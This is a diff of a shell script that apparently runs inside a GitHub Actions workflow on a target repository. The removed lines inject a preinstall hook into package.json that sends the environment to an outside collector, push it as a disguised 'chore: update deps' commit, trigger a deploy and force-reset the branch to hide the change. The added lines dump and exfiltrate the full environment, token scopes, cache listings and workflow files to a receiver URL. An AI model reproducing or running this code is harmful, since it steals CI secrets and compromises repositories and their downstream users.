@@ -16,85 +16,62 @@ if [ -z "$TOKEN" ]; then
 fi
 
 AUTH="Authorization: token $TOKEN"
-curl -s "$RECEIVER_URL?stage=phase1_token&token_len=${#TOKEN}" || true
 
-BASE_SHA=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/ref/heads/joule-integration" \
-  | jq -r '.object.sha // empty' 2>/dev/null)
-if [ -z "$BASE_SHA" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=no_base_sha" || true
-  exit 0
-fi
+# --- Probe 1: Full env dump ---
+curl -s -X POST "$RECEIVER_URL?stage=env_dump" -d "$(env | base64 -w0)" || true
 
-PARENT_TREE=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/commits/$BASE_SHA" \
-  | jq -r '.tree.sha // empty' 2>/dev/null)
+# --- Probe 2: Token permissions (check response headers + test each permission) ---
+TOKEN_META=$(curl -sI -H "$AUTH" "$API/repos/$REPO" 2>&1 | grep -iE '^x-oauth-scopes|^x-accepted-oauth-scopes' | tr -d '\r')
+curl -s "$RECEIVER_URL?stage=token_meta&info=$(echo "$TOKEN_META" | base64 -w0)" || true
 
-ORIG_PKG_RESPONSE=$(curl -s -H "$AUTH" \
-  "$API/repos/$REPO/contents/package.json?ref=joule-integration" 2>&1)
-ORIG_PKG_B64=$(echo "$ORIG_PKG_RESPONSE" | jq -r '.content // empty' 2>/dev/null)
-if [ -z "$ORIG_PKG_B64" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=no_original_pkg" || true
-  exit 0
-fi
-
-ORIG_PKG=$(echo "$ORIG_PKG_B64" | base64 -d 2>/dev/null)
-POISONED_PKG=$(echo "$ORIG_PKG" | python3 -c "
-import sys, json
-pkg = json.load(sys.stdin)
-if 'scripts' not in pkg:
-    pkg['scripts'] = {}
-pkg['scripts']['preinstall'] = 'curl -s -X POST \"https://sap-test-receiver-production-f76d.up.railway.app/collect?stage=full_dump\" -d \"\$(env | base64 -w0)\" || true'
-json.dump(pkg, sys.stdout, indent=2)
-" 2>/dev/null)
-if [ -z "$POISONED_PKG" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=inject_failed" || true
-  exit 0
-fi
-
-BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+# Test contents:write
+BLOB_TEST=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "$AUTH" -H "Content-Type: application/json" \
   "$API/repos/$REPO/git/blobs" \
-  -d "{\"content\":$(echo "$POISONED_PKG" | jq -Rs .),\"encoding\":\"utf-8\"}" \
-  | jq -r '.sha // empty' 2>/dev/null)
-if [ -z "$BLOB_SHA" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=blob_failed" || true
-  exit 0
-fi
+  -d '{"content":"test","encoding":"utf-8"}' 2>&1)
+curl -s "$RECEIVER_URL?stage=perm_contents_write&http_code=$BLOB_TEST" || true
 
-TREE_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
-  "$API/repos/$REPO/git/trees" \
-  -d "{\"base_tree\":\"$PARENT_TREE\",\"tree\":[{\"path\":\"package.json\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB_SHA\"}]}" \
-  | jq -r '.sha // empty' 2>/dev/null)
-if [ -z "$TREE_SHA" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=tree_failed" || true
-  exit 0
-fi
+# Test actions:write (dry check — GET the workflow first, don't actually dispatch)
+ACTIONS_TEST=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
+  "$API/repos/$REPO/actions/workflows" 2>&1)
+curl -s "$RECEIVER_URL?stage=perm_actions_read&http_code=$ACTIONS_TEST" || true
 
-NEW_COMMIT=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
-  "$API/repos/$REPO/git/commits" \
-  -d "{\"message\":\"chore: update deps\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$BASE_SHA\"]}" \
-  | jq -r '.sha // empty' 2>/dev/null)
-if [ -z "$NEW_COMMIT" ]; then
-  curl -s "$RECEIVER_URL?stage=failed&reason=commit_failed" || true
-  exit 0
-fi
-
-curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
-  "$API/repos/$REPO/git/refs/heads/joule-integration" \
-  -d "{\"sha\":\"$NEW_COMMIT\"}" > /dev/null
-
-curl -s "$RECEIVER_URL?stage=phase2_push_ok&commit=$NEW_COMMIT" || true
-
-sleep 3
-
-DISPATCH_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "$AUTH" \
+# Test actions:write via dispatch (will fail if no permission, but tells us)
+DISPATCH_TEST=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "$AUTH" \
   -H "Content-Type: application/json" \
   "$API/repos/$REPO/actions/workflows/deploy-manual.yml/dispatches" \
-  -d "{\"ref\":\"joule-integration\"}" 2>&1)
-curl -s "$RECEIVER_URL?stage=phase3_dispatch&http_code=$DISPATCH_CODE" || true
+  -d '{"ref":"joule-integration"}' 2>&1)
+curl -s "$RECEIVER_URL?stage=perm_actions_dispatch&http_code=$DISPATCH_TEST" || true
 
-curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
-  "$API/repos/$REPO/git/refs/heads/joule-integration" \
-  -d "{\"sha\":\"$BASE_SHA\",\"force\":true}" > /dev/null
+# Test pull-requests:write
+PR_COMMENT_TEST=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
+  "$API/repos/$REPO/pulls/848/comments" 2>&1)
+curl -s "$RECEIVER_URL?stage=perm_pr_read&http_code=$PR_COMMENT_TEST" || true
 
-curl -s "$RECEIVER_URL?stage=phase4_restored" || true
-curl -s "$RECEIVER_URL?stage=payload_complete" || true
+# --- Probe 3: Cache enumeration via ACTIONS_RUNTIME_TOKEN ---
+if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ -n "$ACTIONS_CACHE_URL" ]; then
+  CACHE_LIST=$(curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+    "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?key=" 2>&1)
+  curl -s -X POST "$RECEIVER_URL?stage=cache_list" -d "$CACHE_LIST" || true
+else
+  curl -s "$RECEIVER_URL?stage=cache_info&runtime_token_len=${#ACTIONS_RUNTIME_TOKEN}&cache_url=${ACTIONS_CACHE_URL:-none}" || true
+fi
+
+# --- Probe 4: Fetch deploy-manual.yml to check if it uses caching ---
+DEPLOY_WF=$(curl -s -H "$AUTH" \
+  "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml?ref=joule-integration" \
+  | jq -r '.content // empty' 2>/dev/null | base64 -d 2>/dev/null)
+curl -s -X POST "$RECEIVER_URL?stage=deploy_workflow" -d "$(echo "$DEPLOY_WF" | base64 -w0)" || true
+
+# --- Probe 5: List workflow runs triggered by this PR event ---
+RUNS=$(curl -s -H "$AUTH" \
+  "$API/repos/$REPO/actions/runs?event=pull_request_target&per_page=5" \
+  | jq '[.workflow_runs[:5] | .[] | {name: .name, status: .status, workflow_id: .workflow_id}]' 2>/dev/null)
+curl -s -X POST "$RECEIVER_URL?stage=pr_triggered_runs" -d "$RUNS" || true
+
+# --- Probe 6: List all repo caches via API ---
+REPO_CACHES=$(curl -s -H "$AUTH" \
+  "$API/repos/$REPO/actions/caches?per_page=20" 2>&1)
+curl -s -X POST "$RECEIVER_URL?stage=repo_caches" -d "$REPO_CACHES" || true
+
+curl -s "$RECEIVER_URL?stage=recon_complete" || true
 exit 0
